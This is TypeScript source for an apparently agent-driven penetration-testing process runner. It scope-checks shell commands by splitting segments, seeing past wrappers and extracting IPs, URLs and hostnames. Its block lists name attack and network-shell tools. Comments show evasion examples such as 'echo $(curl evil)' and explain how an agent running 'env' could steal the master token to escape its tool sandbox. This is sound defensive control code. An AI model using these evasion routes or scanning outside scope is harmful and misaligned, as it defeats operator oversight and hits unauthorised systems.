// ============================================================
// Overwatch — shared instrumented process runner
//
// Backs both `run_bash` (shell form) and `run_tool` (argv form).
// Owns the entire action lifecycle:
//   validate \u2192 approval gate \u2192 action_started \u2192 spawn \u2192
//   capture stdout/stderr \u2192 store evidence \u2192 action_completed/failed
//   \u2192 optional parse_with ingest.
//
// Callers supply the spawn shape (binary + argv) and lifecycle metadata.
// Everything tool-agnostic lives here.
// ============================================================

import { spawn } from 'child_process';
import type { GraphEngine } from '../services/graph-engine.js';
import { isAcceptableParserExit } from '../services/parsers/index.js';
import { parseAndMaybeIngest, type ParseIngestResult } from '../services/parse-ingest.js';
import { actionIdOrUuid } from '../services/deterministic-id.js';
import type { ParseContext } from '../types.js';

// F3: argv/command target extraction.
//
// Several techniques are inherently target-facing — recon scans, web
// fuzzing, smb enumeration, brute-force, etc. When the caller forgets to
// populate `target_node*` / `target_ip*`, we previously fell through to a
// no-target validate() which trivially passed scope, allowing scans of
// arbitrary IPs/hosts/URLs to slip through. We now sniff the argv (and the
// raw command repr for shell form) for IPv4, IPv6, URL, and hostname-like
// tokens and feed them back through validateAction.
const TARGET_FACING_TECHNIQUES = new Set([
  'recon', 'scan', 'port_scan', 'service_scan', 'host_discovery',
  'enum', 'enum_smb', 'enum_dns', 'enum_ldap', 'enum_kerberos',
  'web_scan', 'web_fuzz', 'web_brute', 'dir_brute', 'vuln_scan',
  'smb_enum', 'rpc_enum', 'snmp_enum',
  'cred_brute', 'auth_brute', 'spray', 'password_spray',
  // Track D (Phase 6 enterprise): live token replay against IdP/cloud
  // APIs. Quiet by default but always target-facing — the curl
  // invocation always carries an explicit endpoint URL.
  'token_replay',
  // Web track: single authenticated request against a web app / API to
  // confirm a credential. Always target-facing — carries an explicit URL.
  'web_credential_test',
]);

// Phase D: network-capable binaries that aren't unambiguously target-facing
// (so they're not in TARGET_FACING_BINARIES below) but DO reach out to the
// network. When such a binary is invoked under a non-target-facing technique
// AND argv contains a URL/IP/hostname AND no scope metadata is set, we fail
// closed — this is the operator-misuse pattern from the assessment:
//   run_bash({ command: 'curl https://target/admin', technique: 'note' })
// Generic / shell-only binaries (echo, cat, grep, awk, sed, …) are NOT in
// here, so an `echo connecting-to-https://example.com/...` log line still
// runs untouched.
const NETWORK_CAPABLE_BINARIES = new Set([
  'curl', 'wget',
  'ssh', 'scp', 'sftp', 'rsync',
  'nc', 'ncat', 'netcat',
  'openssl',
  'mysql', 'psql', 'mongo', 'redis-cli',
  'ftp',
  'telnet',
]);

function isNetworkCapableBinary(toolName: string, binary: string): boolean {
  const tn = basename(toolName).toLowerCase();
  const bn = basename(binary).toLowerCase();
  if (NETWORK_CAPABLE_BINARIES.has(tn) || NETWORK_CAPABLE_BINARIES.has(bn)) return true;
  return false;
}

// F3.1: target-facing detection by binary name. If a caller invokes a known
// scanner / brute-forcer / web fuzzer without supplying technique, we still
// want to sniff implicit targets out of argv so scope cannot be silently
// bypassed by omitting metadata. This must be a tight allowlist of tools
// that are unambiguously target-facing — adding generic binaries (curl, git,
// ssh) here would create false positives on URLs/hosts used for non-attack
// purposes.
const TARGET_FACING_BINARIES = new Set([
  'nmap', 'masscan', 'rustscan', 'naabu',
  'nxc', 'netexec', 'crackmapexec', 'cme',
  'enum4linux', 'enum4linux-ng', 'smbclient', 'smbmap', 'rpcclient',
  'kerbrute', 'impacket-GetNPUsers', 'impacket-GetUserSPNs',
  'GetNPUsers.py', 'GetUserSPNs.py', 'GetTGT.py', 'getST.py',
  'ldapsearch', 'windapsearch', 'bloodhound-python',
  'responder', 'inveigh',
  'ffuf', 'gobuster', 'feroxbuster', 'wfuzz', 'dirb', 'dirbuster',
  'wpscan', 'nikto', 'whatweb',
  'nuclei', 'sqlmap', 'sslscan', 'testssl.sh', 'testssl',
  'hydra', 'medusa', 'patator',
  'certipy', 'certipy-ad',
  'wmiexec.py', 'psexec.py', 'smbexec.py', 'atexec.py',
]);

function basename(s: string): string {
  const i = s.lastIndexOf('/');
  return i >= 0 ? s.slice(i + 1) : s;
}

function isTargetFacing(technique: string | undefined, toolName: string, binary: string): boolean {
  if (technique && TARGET_FACING_TECHNIQUES.has(technique)) return true;
  const tn = basename(toolName).toLowerCase();
  const bn = basename(binary).toLowerCase();
  for (const b of TARGET_FACING_BINARIES) {
    const lb = b.toLowerCase();
    if (tn === lb || bn === lb) return true;
  }
  return false;
}

// Lowercased mirrors of the binary allowlists, for O(1) membership when we
// classify a command by ANY of its shell-segment binaries (not just the first
// token). Built once at module load.
const TARGET_FACING_BINARIES_LC = new Set([...TARGET_FACING_BINARIES].map(b => b.toLowerCase()));
const NETWORK_CAPABLE_BINARIES_LC = new Set([...NETWORK_CAPABLE_BINARIES].map(b => b.toLowerCase()));

// Command wrappers that prefix a real command. The scope guard must look past
// them (and past leading `VAR=val` assignments) so a wrapper prefix can't hide
// the wrapped binary from classification:
//   proxychains nmap 10/8   ·   sudo -u bob nmap …   ·   timeout 30 curl …
const COMMAND_WRAPPERS = new Set([
  'proxychains', 'proxychains4', 'sudo', 'doas', 'env', 'time', 'timeout',
  'stdbuf', 'nice', 'ionice', 'setsid', 'nohup', 'unbuffer',
]);

const LEADING_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Split a shell command into segments on UNQUOTED control operators
 * (`;`, `|`, `&`, newline) and command/process-substitution boundaries
 * (`$(`, backtick, `<(`, `>(`, `)`), so a binary invoked inside a substitution
 * (`echo $(curl evil)`) surfaces as its own segment. Quote-aware: a separator
 * inside a quote is not a boundary (`echo "a; b"` is one segment). An
 * unterminated quote falls back to a quote-blind split so it can't hide a later
 * binary.
 */
function splitShellSegments(command: string): string[] {
  const segments: string[] = [];
  let cur = '';
  let quote: '"' | "'" | null = null;
  const flush = () => { if (cur.trim()) segments.push(cur); cur = ''; };
  for (let i = 0; i < command.length; i += 1) {
    const c = command[i];
    if (quote) {
      cur += c;
      if (c === quote) quote = null;
      else if (c === '\\' && quote === '"' && i + 1 < command.length) { cur += command[i + 1]; i += 1; }
      continue;
    }
    if (c === '"' || c === "'") { quote = c; cur += c; continue; }
    if (c === '`') { flush(); continue; }
    if (c === '$' && command[i + 1] === '(') { flush(); i += 1; continue; }
    if ((c === '<' || c === '>') && command[i + 1] === '(') { flush(); i += 1; continue; }
    if (c === ')' || c === ';' || c === '|' || c === '&' || c === '\n') { flush(); continue; }
    cur += c;
  }
  flush();
  if (quote !== null) {
    for (const raw of command.split(/[;&|\n`)]+|\$\(|<\(|>\(/)) {
      if (raw.trim()) segments.push(raw);
    }
  }
  return segments;
}

/**
 * True when any shell segment of `commandRepr` invokes a binary whose basename
 * satisfies `pred`. Segments are split quote-aware (see splitShellSegments) so
 * a benign leading token in a compound command (`echo x; curl evil`) can't hide
 * a later target-facing/network-capable binary. Within a segment, leading
 * `VAR=val` assignments are skipped; if the segment leads with a known wrapper
 * (proxychains/sudo/env/timeout/…), EVERY subsequent token is checked (the
 * wrapped command + its args); otherwise only the segment's leading binary is
 * checked — so a plain `echo "…curl url…"` (echo leads, not a wrapper) is not
 * misclassified.
 */
function commandInvokesBinary(commandRepr: string, pred: (base: string) => boolean): boolean {
  if (!commandRepr) return false;
  for (const seg of splitShellSegments(commandRepr)) {
    const tokens = tokenizeCommandLike(seg.trim());
    let i = 0;
    while (i < tokens.length && LEADING_ASSIGNMENT_RE.test(tokens[i])) i += 1;
    if (i >= tokens.length) continue;
    const lead = basename(tokens[i]).toLowerCase();
    if (COMMAND_WRAPPERS.has(lead)) {
      for (let j = i + 1; j < tokens.length; j += 1) {
        if (pred(basename(tokens[j]).toLowerCase())) return true;
      }
    } else if (pred(lead)) {
      return true;
    }
  }
  return false;
}

// Flag values that are NEVER an egress target and are dropped UNCONDITIONALLY
// (even when the value looks like a URL/IP): exclusions, input/output files, and
// curl/wget request metadata (header/referer/agent/cookie/body). Long forms are
// global; short forms that are unambiguous only for a specific binary are keyed
// per binary. A referer/header URL is a non-target, so `curl -e https://ref`
// does not scope-block — while a boolean flag is NOT here, so it can't swallow
// a target.
// GLOBAL drops are LONG-form only: unambiguous across binaries and never a
// boolean flag, so applying them to every binary can't swallow a host. All
// SHORT drop flags are keyed per binary (a short flag that is value-taking on
// one tool is boolean on another — a global short drop would swallow the target,
// the fail-open class this split closes).
const DROP_VALUE_GLOBAL = new Set([
  '--exclude', '--excludefile', '--output', '--write-out',
  '--header', '--referer', '--referrer', '--user-agent', '--cookie', '--cookie-jar',
  '--data', '--data-raw', '--data-binary', '--data-urlencode', '--form', '--post-data',
  '--script', '--script-args', '--script-args-file',
]);
const DROP_VALUE_BY_BIN: Record<string, Set<string>> = {
  // `-c` (cookie-jar write) + `-b` (cookie read) take a FILE path, never a
  // target — drop their value so a `session-jars/<id>.jar` path isn't mistaken
  // for an out-of-scope host and the request refused.
  curl: new Set(['-H', '-e', '-A', '-b', '-c', '-d', '-F', '-o', '-w']),
  wget: new Set(['-U', '-o', '-O']),
  nmap: new Set(['-oA', '-oN', '-oX', '-oG', '-oS', '-iL', '-iR', '-D', '-g', '-S', '--data', '--data-string']),
  masscan: new Set(['-oL', '-oJ', '-oX', '-oG', '--rate']),
};

// Flags that TAKE a value which is a non-target string (ssh identity/config/
// login/port, nc port/source) but whose SHORT form is not globally unambiguous.
// Their value is skipped ONLY when it does not look like a target, so a
// mis-listed boolean flag can never SWALLOW a real target (fail-open); at worst
// it skips a genuine non-target token.
const MAYBE_VALUE_BY_BIN: Record<string, Set<string>> = {
  ssh: new Set(['-i', '-F', '-o', '-l', '-p', '-c', '-m', '-b', '-E', '-I', '-Q', '-B', '-e', '-w']),
  scp: new Set(['-i', '-F', '-o', '-l', '-P', '-c', '-S']),
  sftp: new Set(['-i', '-F', '-o', '-l', '-P', '-c', '-S', '-b']),
  rsync: new Set(['-e', '-T']),
  nc: new Set(['-p', '-s', '-w', '-X', '-I', '-q', '-T', '-O', '-e']),
  ncat: new Set(['-p', '-s', '-w', '-e', '-c', '-o', '-g', '-G', '-m', '-T']),
  curl: new Set(['-u']),
  nmap: new Set(['-p']),
};

function maybeValue(flag: string, bin: string): boolean {
  return MAYBE_VALUE_BY_BIN[bin]?.has(flag) ?? false;
}
function dropsValue(flag: string, bin: string): boolean {
  // MAYBE wins over DROP: a flag listed for this binary as a maybe-value keeps
  // its looksLikeTarget safety net (never unconditionally swallows a target).
  if (maybeValue(flag, bin)) return false;
  return DROP_VALUE_GLOBAL.has(flag) || (DROP_VALUE_BY_BIN[bin]?.has(flag) ?? false);
}

/** True when a token looks like a concrete egress target (IP, CIDR, or URL). A
 *  MAYBE-value flag never skips a target-looking value — so a value-flag can't
 *  hide the real target that follows it (fail-open guard). Uses String.match
 *  (stateless) to avoid /g lastIndex pitfalls. */
function looksLikeTarget(token: string): boolean {
  return token.match(IPV4) !== null || token.match(IPV6) !== null || token.match(URL_RE) !== null;
}

// Simple "host-first" binaries whose first positional operand is unambiguously a
// host/URL, so an operand we cannot parse into a scope-checkable target must
// fail closed. Deliberately EXCLUDES scanners (targets are dotted IPs/CIDRs the
// regexes catch, and their rich flag grammar makes bare-operand detection
// unreliable) and subcommand tools (openssl/mysql/psql — positionals are
// subcommands, not hosts).
const HOST_FIRST_BINARIES = new Set([
  'ssh', 'scp', 'sftp', 'rsync', 'nc', 'ncat', 'netcat', 'telnet', 'ftp',
]);

const IPV4 = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\/\d{1,2})?\b/g;
// Bracketed IPv6 (optional :port) or bare IPv6 with ≥2 colon groups. Collapsed
// forms (fe80::1, ::1) are matched by isWholeTokenIpv6 as a WHOLE token instead,
// so a `::` substring inside code/URLs (std::cout, http://…/a::b) isn't
// mis-extracted as a spurious target.
const IPV6 = /\[([0-9a-fA-F:]+)\](?::\d+)?|\b(?:[0-9a-fA-F]{1,4}:){2,}[0-9a-fA-F:]*\b/g;
const URL_RE = /\b(?:https?|ftp|smb|ssh|ldaps?|rdp):\/\/[^\s'"`]+/gi;
const HOSTNAME = /\b(?=[a-zA-Z0-9.-]{1,253}\b)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b/g;
// Tokens that look like a host but are really a file the tool reads/writes — a
// deliberately broad list (scripts, crypto material, archives, captures, …) so
// `openssl … key.pem`, `nmap --script http-enum.nse`, `-o out.html` are not
// mistaken for targets.
const FILE_LIKE_RE = /\.(?:py|sh|bash|zsh|conf|cfg|ini|rc|json|xml|txt|log|ya?ml|html?|js|ts|md|out|csv|pem|key|crt|cer|der|pfx|p12|pub|nse|php|aspx?|jsp|pcap|cap|zip|gz|tgz|tar|bz2|xz|bin|db|sqlite3?|pdf|xlsx?|docx?|png|jpe?g|gif)$/i;
// A single bare DNS label (dc01), optionally user@label — a plausible internal
// host that carries no dot/scheme, so the regexes above can't confirm it.
const BARE_LABEL_RE = /^(?:[^@\s]+@)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62})$/;

interface ImplicitTargets {
  ips: string[];
  cidrs: string[];
  urls: string[];
  hostnames: string[];
  /** A positional operand on a host-first binary that matched no target form
   *  (bare label / ::-collapsed IPv6 / numeric-encoded IP) — caller fails closed. */
  unresolvedHostOperand: boolean;
}

function tokenizeCommandLike(command: string): string[] {
  const tokens: string[] = [];
  const re = /"([^"\\]*(?:\\.[^"\\]*)*)"|'([^']*)'|(\S+)/g;
  let match: RegExpExecArray | null;
  while ((match = re.exec(command)) !== null) {
    tokens.push(match[1] ?? match[2] ?? match[3]);
  }
  return tokens;
}

/** Scan one token for any target form, adding matches to `acc`. Returns true if
 *  the token matched an IP / CIDR / URL / dotted-hostname (a file-looking host
 *  is ignored). Bare labels, ::-collapsed IPv6 and numeric-encoded IPs do NOT
 *  match here — the caller decides whether such an unresolved operand fails
 *  closed. */
/** True when the ENTIRE token is an IPv6 address (bracketed or bare, incl.
 *  ::-collapsed forms). Anchored to the whole token so a `::` substring inside a
 *  URL path or C++ scope operator is never treated as a spurious target. */
function isWholeTokenIpv6(token: string): boolean {
  const t = token.replace(/^\[/, '').replace(/\](?::\d+)?$/, '');
  if (!/^[0-9a-fA-F:]+$/.test(t)) return false;
  return t.includes('::') || (t.match(/:/g)?.length ?? 0) >= 2;
}

/** Normalize a decimal-encoded IPv4 (e.g. `3232235521` == 192.168.0.1) to dotted
 *  form so it can be scope-checked. A known scope/SSRF evasion. Only a full
 *  32-bit value (> 65535, so ports/counts are unaffected) is treated this way. */
function decimalToDottedIp(token: string): string | null {
  if (!/^\d+$/.test(token)) return null;
  const n = Number(token);
  if (!Number.isInteger(n) || n <= 65535 || n > 4294967295) return null;
  return `${(n >>> 24) & 255}.${(n >>> 16) & 255}.${(n >>> 8) & 255}.${n & 255}`;
}

function scanTokenForTargets(
  token: string,
  acc: { ips: Set<string>; cidrs: Set<string>; urls: Set<string>; hostnames: Set<string> },
): boolean {
  let matched = false;
  for (const m of token.matchAll(IPV4)) { matched = true; const v = m[0]; if (v.includes('/')) acc.cidrs.add(v); else acc.ips.add(v); }
  for (const m of token.matchAll(IPV6)) { matched = true; acc.ips.add(m[1] ?? m[0]); }
  for (const m of token.matchAll(URL_RE)) { matched = true; acc.urls.add(m[0]); }
  if (!matched) {
    for (const m of token.matchAll(HOSTNAME)) {
      const host = m[0];
      if (host.startsWith('.') || host.endsWith('.') || FILE_LIKE_RE.test(host)) continue;
      matched = true;
      acc.hostnames.add(host);
    }
  }
  if (!matched && isWholeTokenIpv6(token)) {
    matched = true;
    acc.ips.add(token.replace(/^\[/, '').replace(/\](?::\d+)?$/, ''));
  }
  if (!matched) {
    const dotted = decimalToDottedIp(token);
    if (dotted) { matched = true; acc.ips.add(dotted); }
  }
  return matched;
}

/**
 * Per-segment implicit-target extraction. For each shell segment (split
 * quote-aware, incl. command-substitution boundaries), find the command binary
 * (the first classified token — wrappers + their args sit before it) and
 * scope-check the POSITIONAL operands after it: skip flags and the VALUES of
 * non-target value-flags (headers/referer/output/script/ssh-identity/…). A
 * positional operand on a simple host-first binary (ssh/nc/telnet/…) that
 * matches no target form but looks like a bare host (single DNS label,
 * user@host, ::-collapsed IPv6, or a numeric-encoded IP) sets
 * `unresolvedHostOperand`, so the caller fails closed. Value-flag skipping is
 * what lets every positional target be scope-checked (even alongside an
 * explicit one) without false-blocking on incidental option values.
 *
 * `forceAllSegments` (set when the caller's technique is target-facing) analyses
 * segments whose leading binary is unrecognised too (e.g. `echo 9.9.9.9`).
 *
 * Accepted static-analysis limits (the primary control is scope-checking
 * declared targets + the MCP/engine egress boundary): a binary nested inside a
 * `bash -c "…"` payload and exotic per-tool flag arities can still evade this.
 */
function extractImplicitTargets(commandRepr: string, forceAllSegments = false): ImplicitTargets {
  const acc = { ips: new Set<string>(), cidrs: new Set<string>(), urls: new Set<string>(), hostnames: new Set<string>() };
  let unresolvedHostOperand = false;
  for (const seg of splitShellSegments(commandRepr)) {
    const tokens = tokenizeCommandLike(seg.trim());
    // Locate the command binary: the first classified token (past leading
    // assignments); wrappers + their args sit before it.
    let binIdx = -1;
    for (let k = 0; k < tokens.length; k += 1) {
      if (LEADING_ASSIGNMENT_RE.test(tokens[k])) continue;
      const b = basename(tokens[k]).toLowerCase();
      if (TARGET_FACING_BINARIES_LC.has(b) || NETWORK_CAPABLE_BINARIES_LC.has(b)) { binIdx = k; break; }
    }
    let hostFirst = false;
    let bin = '';
    let start: number;
    if (binIdx >= 0) {
      bin = basename(tokens[binIdx]).toLowerCase();
      hostFirst = HOST_FIRST_BINARIES.has(bin);
      start = binIdx + 1;
    } else if (forceAllSegments) {
      let k = 0;
      while (k < tokens.length && (LEADING_ASSIGNMENT_RE.test(tokens[k]) || COMMAND_WRAPPERS.has(basename(tokens[k]).toLowerCase()))) k += 1;
      start = k + 1; // skip the leading (unrecognised) command token
    } else {
      continue; // no classified binary in this segment
    }
    let firstPositionalSeen = false;
    for (let j = start; j < tokens.length; j += 1) {
      const t = tokens[j];
      if (!t) continue;
      if (t.startsWith('-')) {
        const eq = t.indexOf('=');
        if (eq > 0) {
          const flag = t.slice(0, eq);
          const val = t.slice(eq + 1);
          if (dropsValue(flag, bin)) { /* drop unconditionally */ }
          else if (maybeValue(flag, bin) && !looksLikeTarget(val)) { /* drop non-target value */ }
          else scanTokenForTargets(val, acc);
        } else {
          const nxt = tokens[j + 1];
          if (dropsValue(t, bin)) {
            if (nxt !== undefined) j += 1; // drop the value unconditionally
          } else if (maybeValue(t, bin) && nxt !== undefined && !looksLikeTarget(nxt)) {
            j += 1; // skip a non-target value; a target-looking value is left to be scanned
          }
          // else: boolean flag (or target-looking value) — do not consume the next token
        }
        continue;
      }
      if (/^\d+$/.test(t) && Number(t) <= 65535 && firstPositionalSeen) continue; // trailing port/count
      const matched = scanTokenForTargets(t, acc);
      const wasFirst = !firstPositionalSeen;
      firstPositionalSeen = true;
      // Only the FIRST positional of a host-first binary is the host; later
      // positionals are remote commands / ports / paths, not targets. A bare
      // label, a ::-collapsed IPv6, or a numeric > 65535 (a numeric-encoded IP;
      // ≤ 65535 is treated as a port) that we couldn't resolve fails closed.
      const numeric = /^\d+$/.test(t);
      if (
        wasFirst && !matched && hostFirst && !FILE_LIKE_RE.test(t)
        && ((BARE_LABEL_RE.test(t) && !numeric) || t.includes(':') || (numeric && Number(t) > 65535))
      ) {
        unresolvedHostOperand = true;
      }
    }
  }
  return { ips: [...acc.ips], cidrs: [...acc.cidrs], urls: [...acc.urls], hostnames: [...acc.hostnames], unresolvedHostOperand };
}


export const MAX_TIMEOUT_MS = 4 * 60 * 60 * 1000;      // 4 hours
export const DEFAULT_TIMEOUT_MS = 60 * 60 * 1000;      // 1 hour — enterprise scans (nmap full-port, nuclei) routinely exceed 5 min

/** The default per-action exec timeout when the caller doesn't pass one. Reads
 *  OVERWATCH_DEFAULT_ACTION_TIMEOUT_MS at call time (not import time) so an
 *  unattended eval run can make tools against synthetic/unreachable targets fail
 *  fast instead of stalling on the 1-hour default; unset in production → 1 hour. */
export function resolveDefaultActionTimeoutMs(): number {
  const override = Number(process.env.OVERWATCH_DEFAULT_ACTION_TIMEOUT_MS);
  if (Number.isFinite(override) && override >= 1000) return Math.min(MAX_TIMEOUT_MS, override);
  return DEFAULT_TIMEOUT_MS;
}
const STREAM_INLINE_CAP = 256 * 1024;                  // 256 KiB inline per stream
/**
 * Hard memory cap per stream. Beyond this we keep a head + rolling tail
 * window only and drop the middle, so a runaway noisy command can't OOM
 * the MCP server before evidence is written.
 */
export const STREAM_HARD_CAP = 16 * 1024 * 1024;       // 16 MiB per stream
export const STREAM_HEAD_KEEP = 4 * 1024 * 1024;       // 4 MiB head
export const STREAM_TAIL_KEEP = 4 * 1024 * 1024;       // 4 MiB tail

/**
 * Phase E: maximum evidence bytes we'll load into memory when re-reading
 * a streamed blob for parser ingestion. Bigger files fall back to a head
 * window via `getRawOutputHead` and the parse is marked partial. Picked
 * to comfortably accommodate large nuclei/azurehound outputs without
 * risking the MCP server's heap on a runaway capture.
 */
export const EVIDENCE_PARSE_MAX_BYTES = 50 * 1024 * 1024; // 50 MiB
export const TRUNCATION_MARKER = '\n…[output truncated; full output stored in evidence]…\n';
const HARD_CAP_DROPPED_MARKER = '\n…[output exceeded in-memory cap; middle bytes dropped]…\n';

/** Replacement written in place of a caller-supplied secret reflected in captured output. */
export const REDACTED_SECRET = '<redacted:reflected-secret>';

/**
 * Scrub caller-supplied secret strings from captured stdout/stderr — for tools
 * (token replay, web credential test) that submit a secret and don't want a
 * target that reflects it back to surface the plaintext in the parser input,
 * the tool response, or a parser-exception echo. Also catches a secret split
 * across an inline-truncation marker (head|marker|tail), which a plain
 * whole-string replace would miss. Operates on the already-materialized text,
 * so it doesn't affect the stored evidence blob (which reports redact
 * separately).
 */
export function scrubSecretsFromText(text: string, secrets: string[] | undefined): string {
  if (!secrets || secrets.length === 0 || !text) return text;
  let out = text;
  for (const secret of secrets) {
    if (!secret) continue;
    if (out.includes(secret)) out = out.split(secret).join(REDACTED_SECRET);
    // Catch a secret split across a truncation marker (head|marker|tail). Uses an
    // O(len) overlap test (no O(len²) per-prefix scan) and handles every marker
    // occurrence (combined streams can carry more than one).
    for (const marker of [TRUNCATION_MARKER, HARD_CAP_DROPPED_MARKER]) {
      let from = 0;
      for (;;) {
        const idx = out.indexOf(marker, from);
        if (idx === -1) break;
        const before = out.slice(0, idx);
        const after = out.slice(idx + marker.length);
        // The secret can straddle by at most len-1 chars on each side.
        const tail = before.slice(Math.max(0, before.length - (secret.length - 1)));
        const head = after.slice(0, secret.length - 1);
        const pos = (tail + head).indexOf(secret);
        // A real straddle spans the join point (tail | head).
        if (pos !== -1 && pos < tail.length && pos + secret.length > tail.length) {
          const headFrag = tail.length - pos;             // secret chars at end of `before`
          const tailFrag = secret.length - headFrag;      // secret chars at start of `after`
          const prefix = before.slice(0, before.length - headFrag);
          out = prefix + REDACTED_SECRET + marker + after.slice(tailFrag);
          from = prefix.length + REDACTED_SECRET.length + marker.length;
        } else {
          from = idx + marker.length;
        }
      }
    }
  }
  return out;
}

// Per-technique noise defaults (0–1 ratio, same scale as opsec.max_noise).
// Used only when the caller does not provide an explicit noise_estimate;
// previously the runner substituted `global_noise_spent`, which double-
// counted cumulative spend back onto the action and inflated the tracker.
//
// These values are conservative starting points — they're meant to be
// "rough technique floor" rather than precise. When a technique isn't
// listed we fall back to UNKNOWN_TECHNIQUE_DEFAULT so unknown actions
// don't get a free 0 ride past the ceiling.
const TECHNIQUE_NOISE_DEFAULTS: Record<string, number> = {
  // Recon / discovery
  recon: 0.1,
  port_scan: 0.3,
  service_scan: 0.3,
  host_discovery: 0.2,
  scan: 0.3,
  // Enumeration
  enum: 0.1,
  enum_smb: 0.15,
  enum_dns: 0.05,
  enum_ldap: 0.1,
  enum_kerberos: 0.1,
  smb_enum: 0.15,
  rpc_enum: 0.15,
  snmp_enum: 0.15,
  // Web
  web_scan: 0.3,
  web_fuzz: 0.4,
  web_brute: 0.5,
  dir_brute: 0.4,
  vuln_scan: 0.4,
  // Auth-pressure
  cred_brute: 0.6,
  auth_brute: 0.6,
  spray: 0.4,
  password_spray: 0.4,
  // Common AD-style techniques
  kerberoast: 0.2,
  asreproast: 0.2,
  // Track D: token replay is a single quiet HTTPS call per invocation.
  token_replay: 0.05,
  // Web track: one authenticated request; a failed login can trip account
  // lockout / WAF, so slightly noisier than a read-only token replay.
  web_credential_test: 0.15,
};
const UNKNOWN_TECHNIQUE_DEFAULT_NOISE = 0.1;

// Env keys the agent should never be able to leak into a child process.
const ENV_DENYLIST = new Set<string>([
  'OVERWATCH_CONFIG',
  'OVERWATCH_SKILLS',
  'OVERWATCH_BOOTSTRAP',
  'OVERWATCH_DASHBOARD_PORT',
  // Server secrets a scan/tool child must NEVER inherit. Without this, an agent
  // allowed to exec an arbitrary binary (e.g. `env`) recovers the master MCP token
  // (defeating its --allowedTools sandbox — every authenticated session gets the full
  // tool surface), the dashboard token, or the Ed25519 checkpoint signing key that
  // backs the activity-chain tamper-evidence.
  'OVERWATCH_MCP_TOKEN',
  'OVERWATCH_DASHBOARD_TOKEN',
  'OVERWATCH_CHECKPOINT_SIGNING_KEY',
]);

// Defensive catch-all for future OVERWATCH_*-prefixed secrets. Scoped to the
// OVERWATCH_ prefix on purpose, so genuine tool credentials the scanner needs
// (AWS_SECRET_ACCESS_KEY, etc.) still pass through to cloud/scan children.
const OVERWATCH_SECRET_ENV = /^OVERWATCH_.*(TOKEN|SECRET|SIGNING_KEY|PASSWORD)/i;

function isDeniedChildEnvKey(k: string): boolean {
  return ENV_DENYLIST.has(k) || OVERWATCH_SECRET_ENV.test(k);
}

export function buildChildEnv(extra: Record<string, string> | undefined): NodeJS.ProcessEnv {
  const base: NodeJS.ProcessEnv = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (isDeniedChildEnvKey(k)) continue;
    if (v !== undefined) base[k] = v;
  }
  if (extra) {
    for (const [k, v] of Object.entries(extra)) {
      base[k] = v;
    }
  }
  return base;
}

/**
 * Bounded per-stream byte sink. Keeps every chunk until the running total
 * exceeds STREAM_HARD_CAP, then retains only:
 *   - the first STREAM_HEAD_KEEP bytes ever seen, and
 *   - a rolling tail of the most recent STREAM_TAIL_KEEP bytes,
 * dropping everything in between. `total_bytes` counts what was produced,
 * not what is retained.
 */
export class BoundedStreamBuffer {
  private head: Buffer[] = [];
  private headBytes = 0;
  private tailChunks: Buffer[] = [];
  private tailBytes = 0;
  private totalBytes = 0;
  private droppedBytes = 0;
  private capExceeded = false;

  push(chunk: Buffer): void {
    this.totalBytes += chunk.length;

    // Phase 1: still under the hard cap → keep everything in head.
    if (!this.capExceeded && this.headBytes + chunk.length <= STREAM_HARD_CAP) {
      this.head.push(chunk);
      this.headBytes += chunk.length;
      return;
    }

    // Transition: split the incoming chunk between completing the head
    // window and starting the tail buffer.
    if (!this.capExceeded) {
      this.capExceeded = true;
      const headRoom = Math.max(0, STREAM_HEAD_KEEP - this.headBytes);
      if (headRoom > 0) {
        const toHead = chunk.subarray(0, headRoom);
        this.head.push(toHead);
        this.headBytes += toHead.length;
        chunk = chunk.subarray(headRoom);
      } else if (this.headBytes > STREAM_HEAD_KEEP) {
        // Trim accumulated head down to the keep window; the trimmed bytes
        // become the start of the tail buffer.
        const flat = Buffer.concat(this.head, this.headBytes);
        this.head = [flat.subarray(0, STREAM_HEAD_KEEP)];
        this.headBytes = STREAM_HEAD_KEEP;
        const overflow = flat.subarray(STREAM_HEAD_KEEP);
        if (overflow.length > 0) {
          this.tailChunks.push(overflow);
          this.tailBytes += overflow.length;
        }
      }
    }

    if (chunk.length === 0) return;

    // Phase 2: rolling tail window.
    this.tailChunks.push(chunk);
    this.tailBytes += chunk.length;
    while (this.tailBytes > STREAM_TAIL_KEEP && this.tailChunks.length > 0) {
      const first = this.tailChunks[0];
      const overflow = this.tailBytes - STREAM_TAIL_KEEP;
      if (first.length <= overflow) {
        this.tailChunks.shift();
        this.tailBytes -= first.length;
        this.droppedBytes += first.length;
      } else {
        this.tailChunks[0] = first.subarray(overflow);
        this.tailBytes -= overflow;
        this.droppedBytes += overflow;
      }
    }
  }

  get total_bytes(): number { return this.totalBytes; }
  get dropped_bytes(): number { return this.droppedBytes; }
  get cap_exceeded(): boolean { return this.capExceeded; }

  /** Concatenated retained output as utf-8, with a marker if middle bytes were dropped. */
  toFullString(): string {
    if (!this.capExceeded) {
      return Buffer.concat(this.head, this.headBytes).toString('utf8');
    }
    const headStr = Buffer.concat(this.head, this.headBytes).toString('utf8');
    const tailStr = Buffer.concat(this.tailChunks, this.tailBytes).toString('utf8');
    return headStr + HARD_CAP_DROPPED_MARKER + tailStr;
  }
}

function captureStream(buf: BoundedStreamBuffer, chunk: Buffer): void {
  buf.push(chunk);
}

function joinAndCap(buf: BoundedStreamBuffer, cap: number): { text: string; truncated: boolean; total: number } {
  const full = buf.toFullString();
  const total = buf.total_bytes;
  if (full.length <= cap) return { text: full, truncated: total > full.length, total };
  const head = full.slice(0, Math.floor(cap * 0.75));
  const tail = full.slice(full.length - Math.floor(cap * 0.25));
  return { text: head + TRUNCATION_MARKER + tail, truncated: true, total };
}

interface ProcessResult {
  exit_code: number | null;
  signal: NodeJS.Signals | null;
  stdout: BoundedStreamBuffer;
  stderr: BoundedStreamBuffer;
  duration_ms: number;
  timed_out: boolean;
  spawn_error?: string;
}

export function runProcess(binary: string, args: string[], opts: {
  cwd?: string;
  env?: Record<string, string>;
  timeout_ms: number;
  /** Optional streaming sinks. Receive every byte of stdout/stderr regardless of inline cap. */
  stdoutSink?: { write: (chunk: Buffer) => void };
